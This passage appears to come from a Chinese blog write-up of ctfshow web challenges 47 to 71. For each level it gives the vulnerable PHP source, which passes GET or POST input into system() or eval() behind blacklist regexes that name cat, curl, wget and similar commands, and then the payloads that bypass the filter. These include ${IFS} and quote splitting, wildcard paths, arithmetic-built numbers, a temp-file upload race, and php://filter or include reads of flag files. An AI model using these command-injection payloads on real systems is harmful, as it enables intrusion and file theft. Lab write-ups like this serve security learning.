class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p><code>&#39;&#39;``\</code>绕过flag<br><code>tac&lt;fla&#39;&#39;g.php||</code><br><code>nl&lt;fla&#39;&#39;g.php||</code></p><h3 id="web48"><a href="#web48" class="headerlink" title="web48"></a>web48</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p><code>?c=nl&lt;fla&#39;&#39;g.php||</code><br><code>?c=nl&lt;fla\g.php||</code></p><h3 id="web49"><a href="#web49" class="headerlink" title="web49"></a>web49</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>?c=nl&lt;fla&#39;&#39;g.php||</code><br><code>?c=nl&lt;fla\g.php||</code></p><h3 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>?c=nl&lt;fla&#39;&#39;g.php||</code><br><code>?c=nl&lt;fla\g.php||</code></p><h3 id="web51"><a href="#web51" class="headerlink" title="web51"></a>web51</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>?c=nl&lt;fla&#39;&#39;g.php||</code><br><code>?c=nl&lt;fla\g.php||</code></p><h3 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p><code>?c=nl$IFS/fla&#39;&#39;g||</code><br><code>?c=nl$IFS/fla/g||</code><br><code>?c=nl$&#123;IFS&#125;/fla&#39;&#39;g||</code></p><h3 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-variable">$d</span> = <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>.<span class="hljs-variable">$d</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;no&#x27;</span>;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p><code>?c=nl$&#123;IFS&#125;fl\ag.php</code><br><code>?c=nl$&#123;IFS&#125;fl&#39;&#39;ag.php</code><br><code>?c=c&#39;&#39;at$&#123;IFS&#125;fla&#39;&#39;g.p&#39;&#39;hp</code></p><h3 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>通配符匹配<code>/bin/cat </code><br><code>?c=/bin/?at$&#123;IFS&#125;f???????</code><br><code>uniq</code> 可检查文本文件中重复出现的行列，删除重复行并输出<br><code>?c=uniq$&#123;IFS&#125;f???.php</code><br><code>?c= mv$&#123;IFS&#125;fla?.php$&#123;IFS&#125;a.txt  </code> –&gt; <code>?c=uniq$&#123;IFS&#125;a.txt</code></p><h3 id="web55"><a href="#web55" class="headerlink" title="web55"></a>web55</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 你们在炫技吗？</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>过滤了字母<br>匹配<code>?c=/bin/base64 flag.php </code><br><code>?c=/???/????64 ????.???</code></p><p>看p神文章<br><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a><br>构造html</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;<br>&lt;html lang=<span class="hljs-string">&quot;en&quot;</span>&gt;<br>&lt;head&gt;<br>    &lt;meta charset=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;<br>    &lt;meta name=<span class="hljs-string">&quot;viewport&quot;</span> content=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;<br>    &lt;title&gt;POST数据包POC&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;form action=<span class="hljs-string">&quot;http://46230c96-8291-44b8-a58c-c133ec248231.chall.ctf.show/&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span> enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;<br>&lt;!--链接是当前打开的题目链接--&gt;<br>    &lt;label <span class="hljs-keyword">for</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;文件名：&lt;/label&gt;<br>    &lt;input type=<span class="hljs-string">&quot;file&quot;</span> name=<span class="hljs-string">&quot;file&quot;</span> id=<span class="hljs-string">&quot;file&quot;</span>&gt;&lt;br&gt;<br>    &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> name=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;提交&quot;</span>&gt;<br>&lt;/form&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br><br></code></pre></td></tr></table></figure><p><img src="/mdimg/ctfshow77/2.png"><br><img src="/mdimg/ctfshow77/3.png"><br>无需文件直接点提交抓包<br><img src="/mdimg/ctfshow77/4.png"><br>抓靶机的包然后改把上面的data粘贴过去<br><img src="/mdimg/ctfshow77/5.png"><br><img src="/mdimg/ctfshow77/6.png"><br><code>?c=.+/???/????????[@-[]</code><br><code>#!bin/sh</code></p><h3 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>  <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>  <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>);<br>  &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>没过滤点，临时文件包含，条件竞争<br>同web55</p><h3 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 还能炫的动吗？</span><br><span class="hljs-comment">//flag in 36.php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>  <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>  <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat &quot;</span>.<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot;.php&quot;</span>);<br>  &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>过滤了点<br>用<code>$(())</code>和取反 构造数字<br><code>$(())</code>用作运算<br><img src="/mdimg/ctfshow77/7.png"><br>当内部为空时<code>$(())==0</code><br><img src="/mdimg/ctfshow77/8.png"><br>对0取反得到-1<br><code>$((~$(())))</code><br><img src="/mdimg/ctfshow77/9.png"><br>拼接可以得到-1-1=-2   <code>$(($((~$(())))$((~$(())))))</code><br><img src="/mdimg/ctfshow77/10.png"><br>以此内推</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">num=<span class="hljs-number">36</span><br>fuyi=<span class="hljs-string">&#x27;$((~$(())))&#x27;</span>  <span class="hljs-comment">#-1</span><br><span class="hljs-keyword">if</span>(num&gt;=<span class="hljs-number">0</span>):<br>    num=<span class="hljs-built_in">abs</span>(~(num))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;$((~$((&#x27;</span>+fuyi*num+<span class="hljs-string">&#x27;))))&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    num=<span class="hljs-built_in">abs</span>(num)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;$((&#x27;</span>+fuyi*num+<span class="hljs-string">&#x27;))&#x27;</span>)<br></code></pre></td></tr></table></figure><p>payload:<code>?c=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</code><br><img src="/mdimg/ctfshow77/11.png"><br><code>$&#123;_&#125;</code>显示上一个命令<br>当没有上一个命令时返回空  则<code>$(())==$(($&#123;_&#125;))</code><br>亦可根据此构造payload</p><h3 id="web58-web65"><a href="#web58-web65" class="headerlink" title="web58-web65"></a>web58-web65</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 你们在炫技吗？</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$c</span>= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>过滤了一些命令执行的函数<br><code>print_r(glob(&quot;*&quot;));</code>读取当前目录<br><code>c=eval($_POST[1]);&amp;1=system(&#39;ls&#39;);</code>套eval无法绕过</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">c=show<span class="hljs-constructor">_source(&#x27;<span class="hljs-params">flag</span>.<span class="hljs-params">php</span>&#x27;)</span>;<br>c=highlight<span class="hljs-constructor">_file(&#x27;<span class="hljs-params">flag</span>.<span class="hljs-params">php</span>&#x27;)</span>;<br>两函数等价<br></code></pre></td></tr></table></figure><p>include+伪协议<br><code>c=include($_POST[&#39;a&#39;]);&amp;a=php://filter/convert.base64-encode/resource=flag.php  </code><br><code>c=show_source(&#39;flag.php&#39;);</code><br><code>c=highlight_file(&#39;flag.php&#39;);</code></p><h3 id="web66"><a href="#web66" class="headerlink" title="web66"></a>web66</h3><p>include、show_source被过滤<br><code>c=highlight_file(&#39;flag.php&#39;);</code> –》》》$flag=”秀秀得了,这次不在这里”;<br><code>c=print_r(scandir(&#39;/&#39;));</code>或者 <code>var_dump(scandir(&#39;/&#39;));</code><br>回显</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Array ( <span class="hljs-selector-attr">[0]</span> =&gt; . <span class="hljs-selector-attr">[1]</span> =&gt; .. <span class="hljs-selector-attr">[2]</span> =&gt; <span class="hljs-selector-class">.dockerenv</span> <span class="hljs-selector-attr">[3]</span> =&gt; bin <span class="hljs-selector-attr">[4]</span> =&gt; dev <span class="hljs-selector-attr">[5]</span> =&gt; etc <span class="hljs-selector-attr">[6]</span> =&gt; flag<span class="hljs-selector-class">.txt</span> <span class="hljs-selector-attr">[7]</span> =&gt; home <span class="hljs-selector-attr">[8]</span> =&gt; lib <span class="hljs-selector-attr">[9]</span> =&gt; media <span class="hljs-selector-attr">[10]</span> =&gt; mnt <span class="hljs-selector-attr">[11]</span> =&gt; opt <span class="hljs-selector-attr">[12]</span> =&gt; proc <span class="hljs-selector-attr">[13]</span> =&gt; root <span class="hljs-selector-attr">[14]</span> =&gt; run <span class="hljs-selector-attr">[15]</span> =&gt; sbin <span class="hljs-selector-attr">[16]</span> =&gt; srv <span class="hljs-selector-attr">[17]</span> =&gt; sys <span class="hljs-selector-attr">[18]</span> =&gt; tmp <span class="hljs-selector-attr">[19]</span> =&gt; usr <span class="hljs-selector-attr">[20]</span> =&gt; <span class="hljs-selector-tag">var</span> ) <br></code></pre></td></tr></table></figure><p><code>c=highlight_file(&#39;/flag.txt&#39;);</code></p><h3 id="web67"><a href="#web67" class="headerlink" title="web67"></a>web67</h3><p>ban了<code>print_r</code><br><code>var_dump(scandir(&#39;/&#39;));</code><br><code>c=highlight_file(&#39;/flag.txt&#39;);</code></p><h3 id="web68"><a href="#web68" class="headerlink" title="web68"></a>web68</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-built_in">Warning</span>: highlight_file() has been disabled <span class="hljs-keyword">for</span> <span class="hljs-keyword">security</span> reasons <span class="hljs-keyword">in</span> /var/www/html/<span class="hljs-keyword">index</span>.php <span class="hljs-keyword">on</span> <span class="hljs-type">line</span> <span class="hljs-number">19</span><br></code></pre></td></tr></table></figure><p>进来直接ban了<code>highlight_file()</code><br>分析一下，源码应该跟上题一样<br><code>c=var_dump(scandir(&#39;/&#39;));</code>读到flag.txt<br><code>show_source</code>ban了<br><code>include</code>这次没ban<br><code>c=include(&#39;/flag.txt&#39;);</code><br>或者<br><code>c=require(&#39;/flag.txt&#39;);</code><br><strong>include 和 require 除了处理错误的方式不同之外，在其他方面都是相同的：</strong></p><ul><li>require 生成一个致命错误（E_COMPILE_ERROR），在错误发生后脚本会停止执行。</li><li>include 生成一个警告（E_WARNING），在错误发生后脚本会继续执行。</li></ul><p>还有<code>c=readgzfile(&quot;/flag.txt&quot;); </code><br><img src="/mdimg/ctfshow77/12.png"></p><h3 id="web69"><a href="#web69" class="headerlink" title="web69"></a>web69</h3><p>ban了<code>var_dump</code> <code>print_r</code><br> <code>print</code>和<code>echo</code>无法打印数组<br><code>c=echo(implode(&#39;  &#39;,scandir(&#39;/&#39;)));</code>       //<code>implode</code>把数组元素组合为字符串<br><code>c=var_export(scandir(&#39;/&#39;));</code>                    //<code>var_export</code> 类似 <code>var_dump</code><br><code>c=include(&#39;/flag.txt&#39;);</code><br><code>c=require(&#39;/flag.txt&#39;);</code><br><code>c=readgzfile(&quot;/flag.txt&quot;); </code></p><h3 id="web70"><a href="#web70" class="headerlink" title="web70"></a>web70</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><br><span class="hljs-built_in">Warning</span>: error_reporting() has been disabled <span class="hljs-keyword">for</span> <span class="hljs-keyword">security</span> reasons <span class="hljs-keyword">in</span> /var/www/html/<span class="hljs-keyword">index</span>.php <span class="hljs-keyword">on</span> <span class="hljs-type">line</span> <span class="hljs-number">14</span><br><br><span class="hljs-built_in">Warning</span>: ini_set() has been disabled <span class="hljs-keyword">for</span> <span class="hljs-keyword">security</span> reasons <span class="hljs-keyword">in</span> /var/www/html/<span class="hljs-keyword">index</span>.php <span class="hljs-keyword">on</span> <span class="hljs-type">line</span> <span class="hljs-number">15</span><br><br><span class="hljs-built_in">Warning</span>: highlight_file() has been disabled <span class="hljs-keyword">for</span> <span class="hljs-keyword">security</span> reasons <span class="hljs-keyword">in</span> /var/www/html/<span class="hljs-keyword">index</span>.php <span class="hljs-keyword">on</span> <span class="hljs-type">line</span> <span class="hljs-number">21</span><br>你要上天吗？ <br></code></pre></td></tr></table></figure><p><code>c=var_export(scandir(&#39;/&#39;));</code><br><code>c=echo(implode(&#39;  &#39;,scandir(&#39;/&#39;)));</code><br><code>c=include(&#39;/flag.txt&#39;);</code><br><code>c=require(&#39;/flag.txt&#39;);</code><br><code>c=readgzfile(&quot;/flag.txt&quot;); </code></p><h3 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h3><p>给了源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;display_errors&#x27;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-comment">// 你们在炫技吗？</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>  <span class="hljs-variable">$c</span>= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>  <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>  <span 